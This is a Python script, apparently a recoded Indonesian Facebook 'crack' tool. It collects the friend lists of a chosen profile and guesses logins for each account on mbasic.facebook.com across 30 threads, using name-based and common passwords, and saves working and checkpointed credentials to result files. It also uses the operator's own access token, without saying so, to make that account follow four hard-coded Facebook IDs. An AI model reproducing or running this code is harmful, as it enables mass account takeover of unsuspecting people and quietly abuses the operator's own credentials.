# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
# coded by angga kurniawan
# fb.me/gaaaarzxd

q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []

ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]") 
s = requests.Session()
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	os.system("clear")
	print(" "+H+"AU"+N+" : ANGGA KURNIAWAN\n"+N+" \033[0;91mFB"+N+" : FB.ME/GAAAARZXD\n"+N+" \033[0;93mRC"+N+" : M4L!N9 Recoder Aw0kAw0k\n")
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' '+N+' [!] Token Invalid')
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000141059300/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100018047723947/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100054520182692/subscribers?access_token=' + token)
    print(" "+N+"[+] Login Successfully")
    menu()

###dev tokeeeeennnn
def login():
	os.system('clear')
	print ('\n\n '+K+'*'+N+' tools ini menggunakan login token facebook.\n '+M+'*'+N+' silahkan masukan token facebook kamu di bawah')
	token = raw_input('\n '+N+'[?] Token : '+H+'')
	if token in ('open', 'Open', 'OPEN'):
		print ('\n '+M+'*'+N+' note! usahakan akun tumbal login di google chrome terlebih dahulu')
		print (' '+K+'*'+N+' jangan lupa! url ubah ke https://m.facebook.com')
		print (' '+M+'*'+N+' setelah di alihkan ke google chrome. klik titik tiga')
		print (' '+K+'*'+N+' lalu klik Cari di Halaman Tinggal ketik '+H+'EAAA'+N+' Lalu salin.')
		raw_input(' '+H+' tekan enter ')
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('login.txt', 'w')
		zedd.write(token)
		zedd.close()
		print ('\n\n '+K+'*'+N+' selamat datang %s'%(nama))
		time.sleep(2)
		print (' '+N+' mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...')
		time.sleep(2)
		raw_input(' '+M+'*'+N+' tekan enter ')
		bot_komen()
	except KeyError:
		print ('\n\n '+M+'!'+N+' token invalid')
		time.sleep(2)
		login()


##dev menuuujjjjj
def menu():
	os.system('clear')
	global token
	try:
		token = open('.Status','r').read()
		stass = "Premium *"
	except IOError:
		stass = "Premium"
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' '+N+' [!] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	    	user = a['username']
	except KeyError:
		os.system('clear')
		print(' '+N+' [!] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' '+N+' [!] Please Check Your Network !!')
	try:
		token = open('results/hai.txt','r').read()
	except IOError:
		os.system("mkdir results")
		os.system("echo 'Jangan DiEdit Nanti Rusak..' >> results/hai.txt")
	logo()
	print(""+N+"["+K+"+"+N+"]  ---------------------------------------------------")
	print(" "+N+" "+H+"."+N+" Nama : "+N+"%s"%(nama))
	print(""+N+"["+M+"+"+N+"] ---------------------------------------------------")
	print
	print("      "+N+"  Chào mừng đến với 😘")
	print
	print("      "+N+"---------------------------------------------------")
	print(" "+N+"[1]"+H+". "+N+"crack indonesia")
	print(" "+N+"[2]"+H+". "+N+"crack india/bangladesh")
	print(" "+N+"[3]"+H+". "+N+"crack usa")
	print(" "+N+"[4]"+H+". "+N+"crack vietnam")
	print(" "+N+"[5]"+H+". "+N+"check result")
	print(" "+N+"[6]"+H+". "+N+"setting useragent")
	print(" "+N+"[0]"+M+". "+N+"logout")
	print("      "+N+"---------------------------------------------------")
	ask = raw_input("\n "+N+"[?] choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		indo()
	elif ask == "2" or ask == "02":
		indbang()
	elif ask == "3" or ask == "03":
		usa()
	elif ask == "4" or ask == "04":
		viet()
	elif ask == "5" or ask == "05":
		print("\n "+N+"["+M+"1] "+N+"Cek hasil OK")
		print(" "+N+"["+K+"2] "+N+"Cek hasil CP")
		ask = raw_input("\n "+N+"[?] Pilih : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"["+H+"+] "+N+"Results OK Date : %s-%s-%s Total : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" "+N+"[#]------------------------------------------") 
			except (IOError):
				exit(" "+N+"["+M+"!] "+N+" no results bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------") 
				print(" "+N+"["+K+"+] "+N+"Results CP Date : %s-%s-%s Total : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" "+N+"[#]-------------------------------------") 
			except (IOError):
				exit(" "+N+"[!] tidak ada hasil bro")
		else:
			menu()
	elif ask == "6" or ask == "06":
		settingua()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" "+N+" [#] Successfully  Token")
	elif ask == "9" or ask == "99":
		exit(p+"Terima Kasih Telah Menggunakan Script Saya...:)")
	else:
		menu()
 
def indo():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' '+N+' [!] token invalid')
		tokenz()
	print("\n "+N+"["+K+"+"+N+"] type 'me' to crack from friends list")
	idt = raw_input(" "+N+"["+M+"+"+N+"] id public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"["+K+"+"+N+"] nama : "+H+""+sp["name"])
	except KeyError:
		exit(" "+N+"["+M+"!"+N+"] id public not found")
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"["+K+"+"+N+"] total id  : "+M+""+str(len(id)))
	print("      "+N+"---------------------------------------------------")
	ask = raw_input("\n "+N+"["+M+"?"+N+"] want to use a manual password"+M+"? "+H+"Y"+N+"/"+M+"t"+N+" : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"["+H+"+"+N+"] ok saved : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"["+K+"+"+N+"] cp saved : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	print("      "+N+"---------------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'['+O+'%s'+N+'] Cracking %s/%s |OK: '+H+'%s'+N+' |CP: '+K+'%s'+N+' ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'sayang','bismillah','indonesia']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+' ' +uid+ '|' +pw+ '                  ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP] '+N+' ' +uid+ '|' +pw+ '                  ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"["+O+"#"+N+"] finished")

def indbang():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' '+N+' [!] Token Invalid')
		tokenz()
	print("\n "+N+"[+] Type 'me' to Crack From The Friends List")
	idt = raw_input(" "+N+"[+] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"[+] Name : "+sp["name"])
	except KeyError:
		exit(' '+N+'[!] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"[*] Total ID  : "+str(len(id)))
	print(" "+N+"[#] -------------------------------------------")
	ask = raw_input("\n "+N+"[?] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"[+] OK Saved : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"[+] CP Saved : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'786786','102030','445566']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+' ' +uid+ '|' +pw+ '                  ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP] '+N+' ' +uid+ '|' +pw+ '                  ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[#] Finished")

def manual():
	print(" "+N+"[*] Exp : paptete,ngocok,rondodugal")
	pw = raw_input("\n "+N+"[?] Set Password : ").split(",")
	if len(pw) ==0:
		exit(" "+N+"[!] Don't Be Empty")
	print("\n "+N+"[+] OK Saved : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"[+] CP Saved : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK]'+N+'' +uid+ '|' +asu+ '                  ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP]'+N+'' +uid+ '|' +asu+ '                  ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[#] Finished")
	
### SETTING USER AGENT
def settingua():
	ask = raw_input("\n "+N+"[?] Do you want to change the User Agent ? [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n "+N+"[*] Type in chrome search : My User Agent")
			ua = raw_input(" "+N+"[+] Your User Agent : ") 
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print(" "+N+"[✓] Successfully changing User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	elif ask == "t" or ask == "T":
		try:
			ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print("\n "+N+"[✓] Successfully changing User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	else:
		menu()

if __name__ == '__main__':
	os.system("git pull")
	login()
